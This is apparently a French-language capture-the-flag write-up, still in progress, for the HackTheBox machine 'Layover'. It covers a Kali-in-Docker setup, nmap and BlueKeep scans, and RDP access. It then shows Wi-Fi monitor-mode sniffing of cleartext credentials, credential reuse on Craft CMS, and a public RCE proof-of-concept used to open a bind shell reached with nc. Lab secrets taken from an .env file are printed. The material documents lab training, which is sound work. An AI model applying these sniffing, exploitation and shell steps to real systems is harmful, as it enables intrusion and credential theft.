# Résumé — Mise en place environnement Kali + accès RDP (HTB Layover)

## 1. Installation de Docker Desktop

Le premier outil installé (`Docker.sbx`) était en réalité **Docker Sandboxes**, un outil pour agents IA, pas Docker classique. Installation du bon paquet :

```powershell
winget install Docker.DockerDesktop
```

## 2. Déploiement d'un conteneur Kali Linux

```powershell
docker pull kalilinux/kali-rolling
docker run -it --name kali --cap-add=NET_ADMIN --device /dev/net/tun -v kali-data:/root kalilinux/kali-rolling
```

- `--cap-add=NET_ADMIN --device /dev/net/tun` : nécessaire pour faire fonctionner un VPN (OpenVPN) à l'intérieur du conteneur.
- `-v kali-data:/root` : volume persistant pour conserver les données malgré la suppression du conteneur.

Pour relancer le conteneur plus tard (en conservant le terminal) :

```powershell
docker start -ai kali
```

Pour sauvegarder l'état du conteneur (outils installés) dans une image réutilisable :

```powershell
docker commit kali kali-custom
```

## 3. Connexion au VPN HTB

1. Téléchargement du fichier `.ovpn` depuis **app.hackthebox.com** → Connect to HTB → OpenVPN.
2. Copie du fichier dans le conteneur :
   ```powershell
   docker cp chemin\vers\lab_xxx.ovpn kali:/root/
   ```
3. Connexion :
   ```bash
   apt update && apt install -y openvpn
   openvpn --config /root/lab_xxx.ovpn
   ```

## 4. Installation de rdpscan (BlueKeep scanner)

Le bon dépôt est `robertdavidgraham/rdpscan` (pas `zerosum0x0`, qui n'existe pas sous ce nom) :

```bash
cd /root
git clone https://github.com/robertdavidgraham/rdpscan.git
cd rdpscan
apt install -y build-essential libssl-dev
make
cp rdpscan /usr/local/bin/
```

**Problème rencontré** : erreur SSL (`tlsv1 alert protocol version`) car le code forçait `TLSv1_client_method()`, obsolète. Correction :

```bash
sed -i 's/TLSv1_client_method()/TLS_client_method()/' src/tcp.c
gcc src/*.c -lssl -lcrypto -o rdpscan
cp rdpscan /usr/local/bin/
```

Résultat sur la cible HTB (`10.129.116.107`) : `SAFE - Target appears patched`.

## 5. Reconnaissance de la machine HTB "Layover"

```bash
nmap -sV -sC -p22,3389 -A 10.129.116.107
nmap -p- -sV 10.129.116.107
```

Résultat : seulement 2 ports ouverts.
- `22/tcp` — OpenSSH 9.6p1 (Ubuntu)
- `3389/tcp` — RDP (ms-wbt-server)

Confirmation que seuls ces deux ports sont ouverts (scan complet 1-65535).

## 6. Connexion RDP avec les identifiants fournis par HTB

Identifiants fournis pour la machine Layover :
```
contractor / Contractor2026!
```

### Problème : pas d'environnement graphique dans le conteneur Kali

`xfreerdp` nécessite un serveur X11 pour afficher une fenêtre. Solution : utiliser un serveur X11 tournant sur l'hôte Windows (**VcXsrv**).

### Installation et configuration de VcXsrv (sur Windows)

1. Téléchargement : https://sourceforge.net/projects/vcxsrv/
2. Lancement de XLaunch :
   - "Multiple windows"
   - "Start no client"
   - **"Disable access control"** coché (indispensable)
3. Résolution d'un conflit : une ancienne instance de VcXsrv bloquait le port → fermeture via Gestionnaire des tâches / `Stop-Process -Name "vcxsrv*" -Force`, puis relance propre.

### Connexion depuis Kali

Identification de l'adresse de l'hôte Windows depuis le conteneur :

```bash
export DISPLAY=host.docker.internal:0
nc -zv host.docker.internal 6000   # test de connectivité au serveur X11 → succès
```

Connexion RDP réussie :

```bash
xfreerdp /v:10.129.116.107 /u:contractor /p:'Contractor2026!' /cert:ignore
```

## État actuel

- Environnement Kali fonctionnel dans Docker Desktop, avec accès réseau complet (VPN HTB) et affichage graphique opérationnel via VcXsrv.
- Accès RDP obtenu sur la machine Windows "jump host" (`airside-ws01`) de la box HTB Layover.

## Prochaines étapes (chaîne d'attaque Layover, à explorer)

1. Depuis le bureau RDP, énumérer les interfaces réseau disponibles (réseau interne/Wi-Fi simulé).
2. Analyser le trafic réseau capturé pour y trouver des identifiants.
3. Utiliser ces identifiants pour accéder à un portail web interne (Craft CMS).
4. Exploiter une vulnérabilité du CMS pour obtenir une exécution de code.
5. Récupérer des identifiants SSH vers la machine Linux (`10.129.116.107`).
6. Élévation de privilèges locale (liée à CUPS) pour obtenir un accès root.

# HTB Layover — Write-up (progression)

Machine : **Layover** — Medium, Linux — HackTheBox Season 12
IP cible : `10.129.116.107`

---

## 1. Environnement d'attaque

- Kali Linux dans un conteneur Docker (Docker Desktop, Windows), lancé avec les droits réseau nécessaires pour le VPN :
  ```bash
  docker run -it --name kali --cap-add=NET_ADMIN --device /dev/net/tun -v kali-data:/root kalilinux/kali-rolling
  ```
- Connexion au VPN HTB via le fichier `.ovpn` téléchargé sur app.hackthebox.com.
- Affichage graphique fourni par **VcXsrv** sur l'hôte Windows (`DISPLAY=host.docker.internal:0`), nécessaire pour faire tourner `xfreerdp` avec interface graphique.

## 2. Reconnaissance initiale

```bash
nmap -p- -sV 10.129.116.107
```

Seulement deux ports ouverts :
- `22/tcp` — OpenSSH 9.6p1 (Ubuntu)
- `3389/tcp` — RDP (ms-wbt-server)

Scan BlueKeep (`rdpscan`, compilé depuis les sources avec patch SSL) : cible **SAFE**, non vulnérable à CVE-2019-0708.

## 3. Accès RDP initial

Identifiants fournis par HTB pour cette machine : **`contractor` / `Contractor2026!`**

```bash
xfreerdp /v:10.129.116.107 /u:contractor /p:'Contractor2026!' /cert:ignore /drive:kali,/root
```

Connexion réussie sur un poste de travail Windows/Linux nommé **`airside-ws01`** (jump host interne du réseau de l'aéroport fictif HTB International).

## 4. Découverte du réseau Wi-Fi interne

Sur `airside-ws01`, énumération des interfaces réseau :

```bash
sudo -l      # contractor a sudo sur les groupes netdev, wireshark
iw dev       # révèle wlan2 et wlan3 (interfaces Wi-Fi simulées, mac80211_hwsim)
```

Un réseau **"HTB International WiFi"**, ouvert (sans chiffrement), est détecté et rejoint :

```bash
sudo iwconfig wlan2 essid "HTB International WiFi"
```

## 5. Capture de trafic Wi-Fi

Passage de l'interface en mode monitor pour capter le trafic des autres hôtes du réseau (pas seulement le sien) :

```bash
sudo iw dev wlan2 set type monitor
sudo iw dev wlan2 set channel 6
sudo tcpdump -i wlan2 -w capture6.pcap
```

Analyse avec Wireshark (après transfert vers Kali via le partage `/drive:kali,/root` de FreeRDP) :

- Une requête HTTP `GET /` vers `10.13.37.1` révèle un portail captif : **`terminal.htb`**, qui renvoie vers **`portal.international.htb`**, avec mention d'un portail employé à `portal.international.htb/miles/`.
- Capture de requêtes **`POST /miles/login.php`** répétées (toutes les ~40s), en clair, émises par un autre hôte (`10.13.37.132` → `10.13.37.10`).
- Extraction des identifiants depuis le flux TCP (Follow → HTTP Stream) :
  ```
  username=jenny
  password=Fl1ghtDeck2026!
  ```
  (lecture hexadécimale initiale erronée laissant croire à un espace dans le mot de passe — corrigé après vérification)

## 6. Portail web "HTB Airways Miles"

Ajout des domaines internes à `/etc/hosts` :
```
10.13.37.1  terminal.htb
10.13.37.1  portal.international.htb
```

Connexion réussie à `http://portal.international.htb/miles/` avec `jenny` / `Fl1ghtDeck2026!` → tableau de bord passager (Gold Member, miles, réservation).

Exploration du site révèle que `/miles/` est un système de login **PHP maison indépendant** (non lié à Craft CMS), utilisé comme leurre/étape intermédiaire.

## 7. Découverte et accès au panneau d'administration Craft CMS

Recherche du vrai panneau d'administration (chemin deviné puis confirmé via le JS `window.Craft` embarqué) :

```
http://portal.international.htb/admin/login
```

Connexion réussie avec les **mêmes identifiants** `jenny` / `Fl1ghtDeck2026!` → accès confirmé au CP (Control Panel) Craft CMS, compte non-admin (`userIsAdmin: false`), version **Craft CMS 5.9.8**.

## 8. Exploitation — CVE-2026-28695 (bypass), RCE authentifiée

Recherche d'une vulnérabilité exploitable avec un compte non-admin sur Craft CMS 5.9.8 : identification du bypass public **CVE-2026-28695** (contournement du correctif officiel via le gadget `yii\behaviors\AttributeTypecastBehavior` → `Psy\Readline\Hoa\ConsoleProcessus::execute`), exploitable par n'importe quel compte CP authentifié (Content Editor suffit), via l'action non-Twig `admin/actions/element-search/search`.

Script PoC public récupéré (`exploit.py`, dépôt `gbuyssens/CVE-2026-28695-craft-rce-bypass`), exécuté **depuis le jump host** (seul capable de résoudre `portal.international.htb`).

### Débogage rencontré
- Faux positif de connexion dans le script (vérifiait un `csrfTokenValue` présent même sur la page de login après échec, donc "authenticated" affiché à tort).
- Confusion initiale sur le mot de passe exact (espace ou non) — résolue en testant directement la connexion dans le navigateur : mot de passe réel **`Fl1ghtDeck2026!`** (sans espace).
- Déclenchement du **cooldown anti-bruteforce** de Craft après plusieurs tentatives ratées (dues aux faux essais de mot de passe) → attente de ~3 minutes nécessaire avant que l'API accepte à nouveau les bons identifiants.

### Confirmation de l'exécution de code

```bash
python3 exploit.py http://portal.international.htb --check -u jenny -p 'Fl1ghtDeck2026!'
```

Résultat : **`[+] RCE CONFIRMED — +5.01s injected latency`**

### Obtention d'un shell

```bash
python3 exploit.py http://portal.international.htb --bind 4445 -u jenny -p 'Fl1ghtDeck2026!'
nc portal.international.htb 4445
```

Shell obtenu en tant qu'utilisateur **`www-data`** sur la vraie machine Linux cible (`10.129.116.107`).

## 9. Découverte des secrets applicatifs

Dans `/var/www/portal/.env` :

```
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
```

## État actuel

Shell `www-data` actif sur la cible, accès direct à la base de données MySQL en cours d'exploration pour localiser des identifiants supplémentaires (table mentionnée dans le contexte global : paramètres de relais mail chiffrés, déchiffrables via `CRAFT_SECURITY_KEY`), dans l'objectif de pivoter vers un accès SSH et le flag utilisateur.

## Prochaines étapes

1. Interroger la base MySQL (`craftuser` / `CraftDB_pw_2026`) pour trouver la table contenant les identifiants de relais mail chiffrés.
2. Déchiffrer le mot de passe stocké à l'aide de `CRAFT_SECURITY_KEY` (API Craft `php craft exec` ou reproduction de l'algorithme de chiffrement Craft).
3. Utiliser les identifiants obtenus pour un accès SSH.
4. Récupérer le flag utilisateur.
5. Élévation de privilèges locale (probable vecteur : CUPS, selon le contexte général de la box) pour obtenir root.

